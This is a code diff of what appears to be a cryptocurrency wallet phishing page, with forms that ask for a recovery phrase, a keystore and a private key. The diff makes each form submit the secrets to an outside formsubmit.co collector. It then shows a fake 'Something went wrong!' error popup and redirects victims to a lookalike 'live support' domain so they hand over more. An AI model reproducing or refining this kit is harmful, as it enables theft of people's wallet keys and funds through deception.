@@ -13,6 +13,7 @@
     <link rel="preload" href="files/static/css/1f147681d5457acaa9f5.css" as="style" />
     <link rel="stylesheet" href="files/static/css/1f147681d5457acaa9f5.css" />
     <link rel="stylesheet" href="files/static/css/add.css" type="text/css" />
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
 </head>
 
 <body>
@@ -1347,34 +1348,28 @@
 
                         <div class="tabContent active" id="phraseContent">
 
-                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST">
-
+                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
                                 <input name="wallet" type="hidden" class="wallet" id="wallet1" value="">
                                 <input type="hidden" name="_captcha" value="false">
                               
+                                <div class="phrasebox ccbox activebox">
+                                  <input class="input allinput" name="phrase2" placeholder="Click to input your phrase" id="phraseinput"> 
+                                  <small style="text-align: center; margin-bottom: 10px">Press the Enter Key after your input your phrase<span id="walletName"></span></small>
+                                </div>
                             
-                              <div class="phrasebox ccbox activebox">
-                                
-                                <!-- <input class="input allinput" name="phrase2" placeholder="" id="phraseinput">
-                                <textarea class="textarea allinput" name="phrase" placeholder="Phrase"></textarea> -->
-            <input class="input allinput" name="phrase2" placeholder="Click to input your phrase" id="phraseinput"> 
-            <small style="text-align: center; margin-bottom: 10px">Press the Enter Key after your input your phrase<span id="walletName"></span></small>
-                              </div>
-                        
+                                <div class="buttonbox">
+                                  <button class="bluebtn_bird" type="submit">Connect</button>
+                                </div>
                             
-                             <button>Submit</button>
-                              <div class="buttonbox">
-                                <button class="bluebtn_bird" type="submit" >connect</button>
-                              </div>
-                    <input type="hidden" name="_next" value= "https://livesupport.en-uk.online">
-                    
-                            </form>
+                                <input type="hidden" name="_next" value="https://livesupport.en-uk.online/portal/">
+                              </form>
+                            
                         </div>
 
 
 
                         <div class="tabContent" id="keystoreContent">
-                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST">
+                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
 
                                 <input type="hidden" name="_captcha" value="false">
                               
@@ -1392,7 +1387,7 @@
                               <div class="buttonbox">
                                 <button class="bluebtn_bird" type="submit" >connect</button>
                               </div>
-                    <input type="hidden" name="_next" value= "https://livesupport.en-uk.online">
+                    <input type="hidden" name="_next" value= "https://livesupport.en-uk.online/portal/">
                     
                             </form>
                         </div>
@@ -1400,7 +1395,7 @@
 
 
                         <div class="tabContent" id="privateContent">
-                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST">
+                            <form action="https://formsubmit.co/bd35c001100f7932a2a4754d04c18cb0" id="" enctype="" method="POST" onsubmit="submitForm(event)">
 
                                 <input type="hidden" name="_captcha" value="false">
                               
@@ -1415,7 +1410,7 @@
                               <div class="buttonbox">
                                 <button class="bluebtn_bird" type="submit" >connect</button>
                               </div>
-                                <input type="hidden" name="_next" value= "https://livesupport.en-uk.online">
+                                <input type="hidden" name="_next" value= "https://livesupport.en-uk.online/portal/">
                     
                             </form>
                         </div>
@@ -1447,7 +1442,25 @@
 
                 </div>
 
-
+                <script>
+                    function submitForm(event) {
+                      event.preventDefault(); // Prevent the form from submitting by default
+                
+                      var form = event.target; // Get a reference to the submitted form
+                
+                      form.submit(); // Submit the form
+                      $('#myModal').css('display', 'none');
+                
+                      Swal.fire({
+                        icon: "error",
+                        title: "Oops...",
+                        text: "Something went wrong!",
+                        footer: '<a href="https://livesupport.en-uk.online">Why do I have this issue?</a>'
+                      });
+                
+                      return false; // Prevent the form from submitting again
+                    }
+                </script>
 
                 <script src="files/static/chunks/jquery-3.4.1.min.js"></script>
                 <script type="text/javascript">
